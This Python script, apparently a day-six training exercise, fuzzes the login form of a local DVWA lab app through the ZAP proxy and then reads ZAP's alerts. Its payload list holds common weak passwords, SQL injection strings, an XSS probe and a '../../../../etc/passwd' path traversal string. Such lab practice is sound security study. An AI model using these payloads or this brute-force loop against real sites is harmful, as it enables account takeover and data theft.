from zapv2 import ZAPv2
from dotenv import load_dotenv
import requests, time, os, urllib3

urllib3.disable_warnings()
load_dotenv()

API_KEY = os.getenv("ZAP_API_KEY")
ZAP_URL = os.getenv("ZAP_URL")

zap = ZAPv2(apikey=API_KEY, proxies={"http": ZAP_URL, "https": ZAP_URL})

# Common weak passwords
PAYLOADS = [
    "admin", "password", "123456","hellloloolololololololololo", "admin123", "root",
    "letmein", "qwerty", "abc123", "welcome", "monkey",
    "dragon", "master", "pass", "test", "guest",
    "' OR '1'='1", "' OR 1=1--", "admin'--",
    "<script>alert(1)</script>", "../../../../etc/passwd"
]

def send_login_requests():
    print("[*] Sending login requests through ZAP proxy for fuzzing...")
    session = requests.Session()
    session.proxies = {"http": ZAP_URL, "https": ZAP_URL}
    session.verify = False

    results = []
    for pwd in PAYLOADS:
        try:
            r = session.post(
                "http://127.0.0.1/dvwa/login.php",
                data={"username": "admin", "password": pwd, "Login": "Login"},
                timeout=10
            )
            status = "LOGIN SUCCESS" if "logout" in r.text.lower() else "blocked"
            results.append({"payload": pwd, "status_code": r.status_code, "result": status})
            print(f"  Payload: {pwd[:30]:30} | HTTP: {r.status_code} | {status}")
        except Exception as e:
            print(f"  Error with payload {pwd}: {e}")
        time.sleep(0.5)

    print(f"\n[+] Fuzzing complete — {len(PAYLOADS)} payloads sent")
    print("[+] All requests captured in ZAP History tab")

    # Summary
    success = [r for r in results if r["result"] == "LOGIN SUCCESS"]
    print(f"\n[+] Successful logins: {len(success)}")
    for s in success:
        print(f"    Payload: {s['payload']}")

    return results

def check_zap_alerts():
    print("\n[*] Checking ZAP alerts after fuzzing...")
    alerts = zap.core.alerts(baseurl="http://127.0.0.1/dvwa/login.php")
    print(f"[+] Alerts on login page: {len(alerts)}")
    for a in alerts:
        print(f"  [{a.get('risk','?'):13}] {a.get('name','')}")
    return alerts

if __name__ == "__main__":
    send_login_requests()
    check_zap_alerts()
    print("\n[✓] Day 6 Fuzzer complete!")
